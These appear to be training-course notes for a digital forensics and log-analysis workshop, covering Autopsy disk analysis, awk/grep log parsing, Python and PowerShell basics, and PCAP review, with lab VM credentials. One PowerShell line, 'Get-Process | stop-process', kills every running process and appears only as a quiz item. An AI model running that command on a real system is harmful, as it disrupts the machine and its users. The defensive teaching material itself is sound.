@@ -1,0 +1,1609 @@
+Please download the following file:
+https://s3.amazonaws.com/StrategicSec-Files/Basic_Forensics_Lab_Manual_Labs_1-9.docx
+
+
+##############################
+#  Day 1: Dead Box Forensics #
+##############################
+VM for these labs
+-----------------
+https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu-v3.zip
+user: malware
+pass: malware
+
+
+Type the following command in a terminal window
+cd /home/malware/Desktop/HelixLabs/
+unzip image.zip
+sudo apt-get install -y autopsy bless
+
+
+From your terminal, type 'sudo autopsy' and press enter. This will start a web server that will listen on port 9999.
+
+Simply open up Firefox and navigate to http://localhost:9999/autopsy.  
+
+
+If you wait a few seconds, Firefox should open up automatically.
+
+If you scroll down you will see “Open Case” “New Case” “Help”.  We want “New Case”.
+
+The next few screens we will need to fill out some information.  
+
+Reference:
+Basic_Forensics_Lab_Manual_Labs_1-9.docx Page 9
+
+
+
+
+Case Name: Case1
+Description: None
+Investigator Names: <Your Name>
+
+Click “New Case” when you’re ready.
+
+
+Reference:
+Basic_Forensics_Lab_Manual_Labs_1-9.docx Page 10
+
+
+
+
+
+At this screen, click “Add Host”
+
+The following screen should be left as is.  So just click “Add Host” at the bottom of the screen to move on.
+
+Simply click “Add Image”
+
+
+Reference:
+Basic_Forensics_Lab_Manual_Labs_1-9.docx Page 12
+
+
+
+
+
+
+Click “Add Image File”
+
+Reference:
+Basic_Forensics_Lab_Manual_Labs_1-9.docx Page 13
+
+
+On the “Add A New Image” screen we need to fill out some information.
+
+Location: This is where you unzipped the image from the image.zip (provided) too.  For example, if you unzipped it to the default path, the path will be “/home/malware/Desktop/HelixLabs/image”
+
+Type: Disk
+Import Method: Move
+
+
+Reference:
+Basic_Forensics_Lab_Manual_Labs_1-9.docx Page 14
+
+
+
+When you’re done click “Next”
+
+
+
+
+On this screen, change it from “Disk Image” to “Volume Image” and the click OK
+
+Reference:
+Basic_Forensics_Lab_Manual_Labs_1-9.docx Page 16
+
+
+
+
+Here we want to calculate the hash value and verify after importing.  Also, leave the “File System Details” the way they are.
+
+Click “Add” when you are ready to move on.
+
+Hit “OK”
+
+Finally, click “Analyze” to start analyzing the image.
+
+
+
+
+
+Police Report – First Case
+
+Reference:
+Basic_Forensics_Lab_Manual_Labs_1-9.docx Page 20
+
+Before we go through the image, let’s read the police report to see what we are up against.
+
+The scenario is: Joe Jacobs, 28, was arrested yesterday on charges of selling illegal drugs to high school students. A local police officer posed as a high school student was approached by Jacobs in the parking lot of Smith Hill High School. Jacobs asked the undercover cop if he would like to buy some marijuana. Before the undercover cop could answer, Jacobs pulled some out of his pocket and showed it to the officer.  Jacobs said to the officer "Look at this stuff, Colombians couldn't grow it better! My supplier not only sells it direct to me, he grows it himself."   
+
+Jacobs has been seen on numerous occasions hanging out at various local high school parking lots around 2:30pm, the time school usually ends for the day. School officials from multiple high schools have called the police regarding Jacobs' presence at their school and noted an increase in drug use among students, since his arrival.  
+
+The police need your help. They want to try and determine if Joe Jacobs has been selling drugs to students at other schools besides Smith Hill. The problem is no students will come forward and help the police. Based on Joe's comment regarding the Colombians, the police are interested in finding Joe Jacob's supplier/producer of marijuana.   
+
+Jacobs has denied selling drugs at any other school besides Smith Hill and refuses to provide the police with the name of his drug supplier/producer. Jacobs also refuses to validate the statement that he made to the undercover officer right before his arrest. Upon issuing a search warrant and searching of the suspect's house the police were able to obtain a small amount of marijuana. The police also seized a single floppy disk, but no computer and/or other media was present in the house.   
+
+The police have imaged the suspect's floppy disk and have provided you with a copy. They would like you to examine the floppy disk and provide answers to the following questions. The police would like you to pay special attention to any information that might prove that Joe Jacobs was in fact selling drugs at other high schools besides Smith Hill.  They would also like you to try and determine if possible who Joe Jacob's supplier is.  
+
+Jacob's posted bail set at $10,000.00. Afraid he may skip town, the police would like to get him locked up as soon as possible. To do so, the police have asked that you have the results fully completed and submitted by October 25, 2002. Please provide the police with a strong case consisting of your specific findings related to the questions, where the findings are located on the disk, processes and techniques used, and any actions that the suspect may have taken to intentionally delete, hide and/or alter data on the floppy disk. Good Luck!  
+
+Any names, locations, and situations presented are completely made up. Any resemblance to any name, locations and/or situation is purely coincidence.  
+
+
+Questions for the First Case
+
+1) Who is Joe Jacob's supplier of marijuana and what is the address listed for the supplier?
+2) What crucial data is available within the coverpage.jpg file and why is this data crucial?
+3) What (if any) other high schools besides Smith Hill does Joe Jacobs frequent?
+4) For each file, what processes were taken by the suspect to mask them from others?
+5) What processes did you (the investigator) use to successfully examine the entire contents of each file?
+6) What Microsoft program was used to create the Cover Page file. What is your proof? (Proof is the key to getting this question right, not just making a guess). 
+
+
+
+Question 1:
+The file that we are most interested in is the “JimmyJungle.doc”  Export the file to your desktop by clicking on the file name and then export in the lower frame. Open it up in Open Office.
+
+
+Bingo!  The suppliers name and address.
+Jimmy Jungle
+626 Jungle Ave Apt 2
+Jungle, NY 11111
+ 
+
+
+
+Question 2:
+
+What crucial data is available within the coverpage.jpg file and why is this data crucial?
+In the same “File Analysis” screen let’s analyze the cover page.
+
+Nothing very interesting here, let’s check the metadata.  Under Hex click report.
+
+Let’s note the size
+
+Size: 15585 bytes (0x3ce1)
+
+Now let’s move over to “Image Detail” on the top tabs.
+
+Scroll all the way to the bottom and click “73-103(31) -> EOF”
+
+It looks like a bunch of junk, let’s examine it a bit more closely.
+
+“pw=goodtimes”  hmm wonder what that could mean.  There is another way that we could pull this out.  Click “display” under Hex at the top of the screen.  To me this is a bit easier to see and go through.  The password was hidden away in the slack space of the file.
+
+
+
+
+Question 3:
+
+What (if any) other high schools besides Smith Hill does Joe Jacobs frequent?
+
+For this next question let’s go back to the “File Analysis” screen and click on “Scheduled Visits.exe”.  
+
+
+
+Something that stands out almost immediately is the “Scheduled Visits.xls” there is an excel spreadsheet in there.  Something tells me that this is not an executable.  To find out whether this is or not, we need to look at the file signature.  Under ASCII click “report”
+
+The information that we are interested in is the “Sectors 104 105”  As well as the “File Type”  notice it says “empty (Zip archive data, at least v2.0 to extract)”  Let’s go back to the “Image Details” screen and scroll to the bottom.
+
+We want to look at sectors 104 – 108.
+
+Here is the ASCII contents of sectors 104 – 108.  To figure out the file signature we need to look at the Hex.  Click on “display” under Hex.
+
+Our file starts at 104 and we are currently viewing Sectors 104 – 108, so we don’t really need to hunt around in the hex.  What we need to pay attention too is the first 4 bytes.  Zip files have a file signature of 50 4B 03 04 or PK.. (that’s P K <dot> <dot>).  For a list of different file signatures visit (http://www.garykessler.net/library/file_sigs.html ). What do we see?  The very top of the Hex dump 504b0304 and PK…  Looks like it is a zip file.  Export the file and change the file extension from .exe to .zip.
+
+
+If you want to perform these steps in a hex editor then you can use Bless by typing the following commands in a terminal window:
+cd /home/malware/Desktop/HelixLabs/
+unzip image.zip
+sudo apt-get install -y bless
+bless image
+
+
+########################
+#  Day 1: Log Analysis #
+########################
+
+
+##########
+# VMWare #
+##########
+- For this workshop you'll need the latest version of VMWare Workstation (Windows), Fusion (Mac), or Player.
+ 
+- Although you can get the VM to run in VirtualBox, I will not be supporting this configuration for this class.
+
+
+VM for these labs
+-----------------
+https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu-v3.zip
+user: strategicsec
+pass: strategicsec
+
+https://s3.amazonaws.com/StrategicSec-VMs/Win7x64.zip
+username: workshop
+password: password
+
+
+
+
+##############################################
+# Log Analysis with Linux command-line tools #
+##############################################
+The following command line executables are found in the Mac as well as most Linux Distributions.
+
+cat –  prints the content of a file in the terminal window
+grep – searches and filters based on patterns
+awk –  can sort each row into fields and display only what is needed
+sed –  performs find and replace functions
+sort – arranges output in an order
+uniq – compares adjacent lines and can report, filter or provide a count of duplicates
+
+
+
+###############
+# Apache Logs #
+###############
+
+Reference:
+http://www.the-art-of-web.com/system/logs/
+
+wget https://s3.amazonaws.com/SecureNinja/Python/access_log
+
+
+You want to list all user agents ordered by the number of times they appear (descending order):
+
+awk -F\" '{print $6}' access_log | sort | uniq -c | sort -fr
+
+
+
+Using the default separator which is any white-space (spaces or tabs) we get the following:
+
+awk '{print $1}' access_log         # ip address (%h)
+awk '{print $2}' access_log         # RFC 1413 identity (%l)
+awk '{print $3}' access_log         # userid (%u)
+awk '{print $4,5}' access_log       # date/time (%t)
+awk '{print $9}' access_log         # status code (%>s)
+awk '{print $10}' access_log        # size (%b)
+
+You might notice that we've missed out some items. To get to them we need to set the delimiter to the " character which changes the way the lines are 'exploded' and allows the following:
+
+awk -F\" '{print $2}' access_log    # request line (%r)
+awk -F\" '{print $4}' access_log    # referer
+awk -F\" '{print $6}' access_log    # user agent
+
+
+awk -F\" '{print $6}' access_log \
+  | sed 's/(\([^;]\+; [^;]\+\)[^)]*)/(\1)/' \
+  | sort | uniq -c | sort -fr
+
+
+The next step is to start filtering the output so you can narrow down on a certain page or referer. Would you like to know which pages Google has been requesting from your site?
+
+awk -F\" '($6 ~ /Googlebot/){print $2}' access_log | awk '{print $2}'
+Or who's been looking at your guestbook?
+
+awk -F\" '($2 ~ /guestbook\.html/){print $6}' access_log
+
+
+Reference:
+https://blog.nexcess.net/2011/01/21/one-liners-for-apache-log-files/
+
+# top 20 URLs from the last 5000 hits
+tail -5000 ./access_log | awk '{print $7}' | sort | uniq -c | sort -rn | head -20
+tail -5000 ./access_log | awk '{freq[$7]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+ 
+# top 20 URLS excluding POST data from the last 5000 hits
+tail -5000 ./access_log | awk -F"[ ?]" '{print $7}' | sort | uniq -c | sort -rn | head -20
+tail -5000 ./access_log | awk -F"[ ?]" '{freq[$7]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+ 
+# top 20 IPs from the last 5000 hits
+tail -5000 ./access_log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
+tail -5000 ./access_log | awk '{freq[$1]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+ 
+# top 20 URLs requested from a certain ip from the last 5000 hits
+IP=1.2.3.4; tail -5000 ./access_log | grep $IP | awk '{print $7}' | sort | uniq -c | sort -rn | head -20
+IP=1.2.3.4; tail -5000 ./access_log | awk -v ip=$IP ' $1 ~ ip {freq[$7]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+ 
+# top 20 URLS requested from a certain ip excluding, excluding POST data, from the last 5000 hits
+IP=1.2.3.4; tail -5000 ./access_log | fgrep $IP | awk -F "[ ?]" '{print $7}' | sort | uniq -c | sort -rn | head -20
+IP=1.2.3.4; tail -5000 ./access_log | awk -F"[ ?]" -v ip=$IP ' $1 ~ ip {freq[$7]++} END {for (x in freq) {print freq[x], x}}' | sort -rn | head -20
+ 
+# top 20 referrers from the last 5000 hits
+tail -5000 ./access_log | awk '{print $11}' | tr -d '"' | sort | uniq -c | sort -rn | head -20
+tail -5000 ./access_log | awk '{freq[$11]++} END {for (x in freq) {print freq[x], x}}' | tr -d '"' | sort -rn | head -20
+ 
+# top 20 user agents from the last 5000 hits
+tail -5000 ./access_log | cut -d\  -f12- | sort | uniq -c | sort -rn | head -20
+ 
+# sum of data (in MB) transferred in the last 5000 hits
+tail -5000 ./access_log | awk '{sum+=$10} END {print sum/1048576}'
+
+
+##############
+# Cisco Logs #
+##############
+
+wget https://s3.amazonaws.com/StrategicSec-Files/LogAnalysis/cisco.log
+
+
+AWK Basics
+----------
+To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.
+
+cat cisco.log | awk '{print $5}' | tail -n 4
+
+
+
+
+Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in “$5”, group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through “sort“, using “uniq -c” to count the like entries, then using “sort -rn” to sort it in reverse order.
+
+cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn
+
+
+
+
+While that’s sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren’t conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain “facility-level-mnemonic”.
+
+cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn
+
+
+
+
+
+Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.
+
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:
+
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn
+
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn
+
+cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn
+
+
+
+
+#################################
+# Using Python for log analysis #
+#################################
+
+
+
+
+###########################################
+# Python Basics Lesson 1: Simple Printing #
+###########################################
+
+>>> print 1
+
+>>> print hello
+
+>>> print "hello"
+ 
+>>> print "Today we are learning Python."
+ 
+ 
+ 
+###################################################
+# Python Basics Lesson 2: Simple Numbers and Math #
+###################################################
+ 
+>>> 2+2
+ 
+>>> 6-3
+ 
+>>> 18/7
+ 
+>>> 18.0/7
+ 
+>>> 18.0/7.0
+ 
+>>> 18/7
+ 
+>>> 9%4
+ 
+>>> 8%4
+ 
+>>> 8.75%.5
+ 
+>>> 6.*7
+ 
+>>> 6*6*6
+ 
+>>> 6**3
+ 
+>>> 5**12
+ 
+>>> -5**4
+ 
+ 
+ 
+ 
+ 
+ 
+#####################################
+# Python Basics Lesson 3: Variables #
+#####################################
+ 
+>>> x=18
+ 
+>>> x+15
+ 
+>>> x**3
+ 
+>>> y=54
+ 
+>>> x+y
+ 
+>>> age=input("Enter number here: ")
+        43
+ 
+>>> age+32
+ 
+>>> age**3
+
+>>> fname = raw_input("Enter your first name: ")
+
+>>> lname = raw_input("Enter your first name: ")
+
+>>> fname = raw_input("Enter your name: ")
+Enter your name: Joe
+
+>>> lname = raw_input("Enter your name: ")
+Enter your name: McCray
+
+>>> print fname
+Joe
+
+>>> print lname
+McCray
+
+>>> print fname lname
+
+>>> print fname+lname
+JoeMcCray
+
+ 
+ 
+NOTE:
+Use "input() for integers and expressions, and use raw_input() when you are dealing with strings. 
+ 
+ 
+ 
+ 
+ 
+#################################################
+# Python Basics Lesson 4: Modules and Functions #
+#################################################
+ 
+>>> 5**4
+ 
+>>> pow(5,4)
+ 
+>>> abs(-18)
+ 
+>>> abs(5)
+ 
+>>> floor(18.7)
+ 
+>>> import math
+ 
+>>> math.floor(18.7)
+ 
+>>> math.sqrt(81)
+ 
+>>> joe = math.sqrt
+ 
+>>> joe(9)
+ 
+>>> joe=math.floor
+ 
+>>> joe(19.8)
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###################################
+# Python Basics Lesson 5: Strings #
+###################################
+ 
+>>> "XSS"
+ 
+>>> 'SQLi'
+ 
+>>> "Joe's a python lover"
+ 
+>>> 'Joe\'s a python lover'
+ 
+>>> "Joe said \"InfoSec is fun\" to me"
+ 
+>>> a = "Joe"
+ 
+>>> b = "McCray"
+ 
+>>> a, b
+ 
+>>> a+b
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+########################################
+# Python Basics Lesson 6: More Strings #
+########################################
+ 
+>>> num = 10
+ 
+>>> num + 2
+ 
+>>> "The number of open ports found on this system is " + num
+ 
+>>> num = str(18)
+ 
+>>> "There are " + num + " vulnerabilities found in this environment."
+ 
+>>> num2 = 46
+ 
+>>> "As of 08/20/2012, the number of states that enacted the Security Breach Notification Law is " + `num2`
+ 
+
+ 
+NOTE:
+Use "input() for integers and expressions, and use raw_input() when you are dealing with strings.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###############################################
+# Python Basics Lesson 7: Sequences and Lists #
+###############################################
+ 
+>>> attacks = ['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+ 
+>>> attacks
+['Stack Overflow', 'Heap Overflow', 'Integer Overflow', 'SQL Injection', 'Cross-Site Scripting', 'Remote File Include']
+ 
+>>> attacks[3]
+'SQL Injection'
+ 
+>>> attacks[-2]
+'Cross-Site Scripting'
+ 
+ 
+ 
+ 
+ 
+ 
+########################################
+# Python Basics Level 8: If Statement #
+########################################
+>>> attack="SQLI"
+>>> if attack=="SQLI":
+        print 'The attacker is using SQLI'
+ 
+>>> attack="XSS"
+>>> if attack=="SQLI":
+        print 'The attacker is using SQLI'
+
+ 
+#############################
+# Reference Videos To Watch #
+#############################
+Here is your first set of youtube videos that I'd like for you to watch:
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA (watch videos 1-10)
+ 
+ 
+ 
+ 
+ 
+#####################################
+# Lesson 9: Intro to Log Analysis #
+#####################################
+ 
+Login to your StrategicSec Ubuntu machine. You can download the VM from the following link:
+ 
+https://s3.amazonaws.com/StrategicSec-VMs/Strategicsec-Ubuntu-VPN-163.zip
+        username: strategicsec
+        password: strategicsec
+ 
+Then execute the following commands:
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+wget https://s3.amazonaws.com/SecureNinja/Python/access_log
+ 
+ 
+cat access_log | grep 141.101.80.188
+ 
+cat access_log | grep 141.101.80.187
+ 
+cat access_log | grep 108.162.216.204
+ 
+cat access_log | grep 173.245.53.160
+ 
+---------------------------------------------------------
+ 
+Google the following terms:
+        - Python read file
+        - Python read line
+        - Python read from file
+ 
+ 
+ 
+ 
+########################################################
+# Lesson 10: Use Python to read in a file line by line #
+########################################################
+ 
+ 
+Reference:
+http://cmdlinetips.com/2011/08/three-ways-to-read-a-text-file-line-by-line-in-python/
+
+
+
+
+
+
+Let's have some fun.....
+
+
+>>> f = open('access_log', "r")
+
+>>> lines = f.readlines()
+
+>>> print lines
+
+>>> lines[0]
+
+>>> lines[10]
+
+>>> lines[50]
+
+>>> lines[1000]
+
+>>> lines[5000]
+
+>>> lines[10000]
+
+>>> print len(lines)
+
+
+
+
+
+
+ 
+ 
+ 
+---------------------------------------------------------
+vi logread1.py
+ 
+ 
+## Open the file with read only permit
+f = open('access_log', "r")
+ 
+## use readlines to read all lines in the file
+## The variable "lines" is a list containing all lines
+lines = f.readlines()
+ 
+print lines
+ 
+ 
+## close the file after reading the lines.
+f.close()
+ 
+---------------------------------------------------------
+ 
+ 
+Google the following:
+        - python difference between readlines and readline
+        - python readlines and readline
+ 
+ 
+ 
+ 
+ 
+#################################
+# Lesson 11: A quick challenge #
+#################################
+ 
+Can you write an if/then statement that looks for this IP and print "Found it"?
+ 
+ 
+141.101.81.187
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 1: Use Python to look for a value in a list
+ 
+Reference:
+http://www.wellho.net/mouth/1789_Looking-for-a-value-in-a-list-Python.html
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 2: Use Python to prompt for user input
+ 
+Reference:
+http://www.cyberciti.biz/faq/python-raw_input-examples/
+ 
+ 
+ 
+ 
+---------------------------------------------------------
+Hint 3: Use Python to search for a string in a list
+ 
+Reference:
+http://stackoverflow.com/questions/4843158/check-if-a-python-list-item-contains-a-string-inside-another-string
+ 
+ 
+ 
+ 
+ 
+Here is my solution:
+-------------------
+$ python
+>>> f = open('access_log', "r")
+>>> lines = f.readlines()
+>>> ip = '141.101.81.187'
+>>> for string in lines:
+...     if ip in string:
+...             print(string)
+ 
+ 
+ 
+ 
+Here is one student's solution - can you please explain each line of this code to me?
+-------------------------------------------------------------------------------------
+#!/usr/bin/python
+ 
+f = open('access_log')
+ 
+strUsrinput = raw_input("Enter IP Address: ")
+ 
+for line in iter(f):
+    ip = line.split(" - ")[0]
+    if ip == strUsrinput:
+        print line
+ 
+f.close()
+ 
+ 
+ 
+ 
+-------------------------------
+ 
+Working with another student after class we came up with another solution:
+ 
+#!/usr/bin/env python
+ 
+ 
+# This line opens the log file
+f=open('access_log',"r")
+ 
+# This line takes each line in the log file and stores it as an element in the list
+lines = f.readlines()
+ 
+ 
+# This lines stores the IP that the user types as a var called userinput
+userinput = raw_input("Enter the IP you want to search for: ")
+ 
+ 
+ 
+# This combination for loop and nested if statement looks for the IP in the list called lines and prints the entire line if found.
+for ip in lines:
+    if ip.find(userinput) != -1:
+        print ip
+ 
+ 
+ 
+##################################################
+# Lesson 12: Look for web attacks in a log file #
+##################################################
+ 
+In this lab we will be looking at the scan_log.py script and it will scan the server log to find out common hack attempts within your web server log.
+Supported attacks:
+1.          SQL Injection
+2.          Local File Inclusion
+3.          Remote File Inclusion
+4.          Cross-Site Scripting
+ 
+ 
+ 
+wget https://s3.amazonaws.com/SecureNinja/Python/scan_log.py
+ 
+The usage for scan_log.py is simple.  You feed it an apache log file.
+ 
+cat scan_log.py | less                  (use your up/down arrow keys to look through the file)
+
+
+
+
+
+################################
+# Log Analysis with Powershell #
+################################
+
+VM for these labs
+-----------------
+https://s3.amazonaws.com/StrategicSec-VMs/Win7x64.zip
+        username: workshop
+        password: password
+
+ 
+You can do the updates in the Win7 VM (yes, it is a lot of updates).
+ 
+You'll need to create directory in the Win7 VM called "c:\ps"
+ 
+#####################
+# Powershell Basics #
+#####################
+ 
+PowerShell is Microsoft’s new scripting language that has been built in since the release Vista.
+ 
+PowerShell file extension end in .ps1 .
+ 
+An important note is that you cannot double click on a PowerShell script to execute it.
+ 
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+ 
+dir
+cd
+ls
+cd c:\
+ 
+ 
+To obtain a list of cmdlets, use the Get-Command cmdlet
+ 
+Get-Command
+ 
+ 
+ 
+You can use the Get-Alias cmdlet to see a full list of aliased commands.
+ 
+Get-Alias
+ 
+ 
+ 
+Don't worry you won't blow up your machine with Powershell
+Get-Process | stop-process                              What will this command do?
+Get-Process | stop-process -whatif
+ 
+ 
+To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
+ 
+Get-Help Get-Command
+ 
+Get-Help Get-Service –online
+ 
+Get-Service -Name TermService, Spooler
+ 
+Get-Service –N BITS
+ 
+Start-Transcript
+ 
+PowerShell variables begin with the $ symbol. First lets create a variable
+ 
+$serv = Get-Service –N Spooler
+ 
+To see the value of a variable you can just call it in the terminal.
+ 
+$serv
+ 
+$serv.gettype().fullname
+ 
+ 
+Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
+ 
+$serv | Get-Member
+ 
+Get-Member -InputObject $serv
+ 
+ 
+ 
+ 
+ 
+Let’s use a method and a property with our object.
+ 
+$serv.Status
+$serv.Stop()
+$serv.Refresh()
+$serv.Status
+$serv.Start()
+$serv.Refresh()
+$serv.Status
+ 
+ 
+ 
+ 
+Methods can return properties and properties can have sub properties. You can chain them together by appending them to the first call.
+ 
+ 
+ 
+#############################
+# Simple Event Log Analysis #
+#############################
+ 
+Step 1: Dump the event logs
+---------------------------
+The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
+ 
+To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs.
+If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
+ 
+Get-EventLog -LogName application | Export-Clixml Applog.xml
+ 
+type .\Applog.xml
+ 
+$logs = "system","application","security"
+ 
+The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
+ 
+$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
+ 
+ 
+ 
+Step 2: Import the event log of interest
+----------------------------------------
+To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files.
+Store the results in a variable.
+Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object.
+ 
+The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
+ 
+$seclog = Import-Clixml security.xml
+ 
+$seclog | select -Last 5
+ 
+ 
+Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
+ 
+Get-EventLog Application -After (Get-Date).AddDays(-1)
+ 
+You can use '-after' and '-before' to filter date ranges
+ 
+One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything.
+By default, an ordinary user does not have permission to read the security log.
+ 
+ 
+Step 3: Drill into a specific entry
+-----------------------------------
+To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties.
+ 
+ 
+$seclog | select -first 1 | fl *
+ 
+The message property contains the SID, account name, user domain, and privileges that are assigned for the new login.
+ 
+ 
+($seclog | select -first 1).message
+ 
+(($seclog | select -first 1).message).gettype()
+ 
+ 
+ 
+In the *nix world you often want a count of something (wc -l).
+How often is the SeSecurityPrivilege privilege mentioned in the message property?
+To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
+ 
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
+ 
+If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property.
+ 
+ 
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
+ 
+Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present.
+Use the count property to determine the total number of entries in the event log.
+ 
+$seclog.Count
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# Simple Log File Analysis #
+############################
+ 
+ 
+You'll need to create the directory c:\ps and download sample iss log http://pastebin.com/raw.php?i=LBn64cyA
+ 
+ 
+mkdir c:\ps
+cd c:\ps
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+ 
+ 
+ 
+ 
+       
+       
+       
+ 
+###############################################
+# Intrusion Analysis Using Windows PowerShell #
+###############################################
+ 
+Download sample file http://pastebin.com/raw.php?i=ysnhXxTV into the c:\ps directory
+ 
+ 
+ 
+ 
+ 
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=ysnhXxTV", "c:\ps\CiscoLogFileExamples.txt")
+ 
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt
+ 
+ 
+ 
+ 
+The Select-String cmdlet searches for text and text patterns in input strings and files. You can use it like Grep in UNIX and Findstr in Windows.
+ 
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line
+ 
+ 
+ 
+ 
+To see how many connections are made when analyzing a single host, the output from that can be piped to another command: Measure-Object.
+ 
+Select-String 192.168.208.63 .\CiscoLogFileExamples.txt | select line | Measure-Object
+ 
+ 
+ 
+To select all IP addresses in the file expand the matches property, select the value, get unique values and measure the output.
+ 
+Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique | Measure-Object
+ 
+ 
+ 
+Removing Measure-Object shows all the individual IPs instead of just the count of the IP addresses. The Measure-Object command counts the IP addresses.
+ 
+Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select -ExpandProperty value | Sort-Object -Unique
+ 
+ 
+In order to determine which IP addresses have the most communication the last commands are removed to determine the value of the matches. Then the group command is issued on the piped output to group all the IP addresses (value), and then sort the objects by using the alias for Sort-Object: sort count –des.
+This sorts the IP addresses in a descending pattern as well as count and deliver the output to the shell.
+ 
+Select-String “\b(?:\d{1,3}\.){3}\d{1,3}\b” .\CiscoLogFileExamples.txt | select -ExpandProperty matches | select value | group value | sort count -des
+ 
+ 
+ 
+ 
+This will get the setting for logs in the windows firewall which should be enabled in GPO policy for analysis.
+The command shows that the Firewall log is at:
+%systemroot%\system32\LogFiles\Firewall\pfirewall.log, in order to open the file PowerShell will need to be run with administrative privileges.
+ 
+ 
+First step is to get the above command into a variable using script logic.
+Thankfully PowerShell has a built-in integrated scripting environment, PowerShell.ise.
+ 
+netsh advfirewall show allprofiles | Select-String FileName | select -ExpandProperty line | Select-String “%systemroot%.+\.log" | select -ExpandProperty matches | select -ExpandProperty value | sort –uniq
+ 
+ 
+##############################################
+# Parsing Log files using windows PowerShell #
+##############################################
+ 
+Download the sample IIS log http://pastebin.com/LBn64cyA
+ 
+ 
+(new-object System.Net.WebClient).DownloadFile("http://pastebin.com/raw.php?i=LBn64cyA", "c:\ps\u_ex1104.log")
+ 
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV")}  
+ 
+ 
+ 
+The above command would give us all the WebDAV requests.
+ 
+To filter this to a particular user name, use the below command:
+ 
+Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "OPTIONS")}  
+ 
+ 
+ 
+Some more options that will be more commonly required :
+ 
+For Outlook Web Access : Replace WebDAV with OWA
+ 
+For EAS : Replace WebDAV with Microsoft-server-activesync
+ 
+For ECP : Replace WebDAV with ECP
+ 
+ 
+ 
+To find out the count of the EWS request we can go ahead and run the below command
+ 
+(Get-Content ".\*log" | ? { ($_ | Select-String "WebDAV") -and ($_ | Select-String "Useralias")}).count
+
+
+
+########################
+# Day 2: PCAP Analysis #
+########################
+#################
+# PCAP Analysis #
+#################
+cd /home/malware/Desktop/Browser\ Forensics
+
+ls | grep pcap
+
+perl chaosreader.pl suspicious-time.pcap
+
+firefox index.html
+
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)"
+
+cat index.text | grep -v '"' | grep -oE "([0-9]+\.){3}[0-9]+.*\)" | awk '{print $4, $5, $6}' | sort | uniq -c | sort -nr
+
+sudo tshark -i eth0 -r suspicious-time.pcap -qz io,phs   
+
+
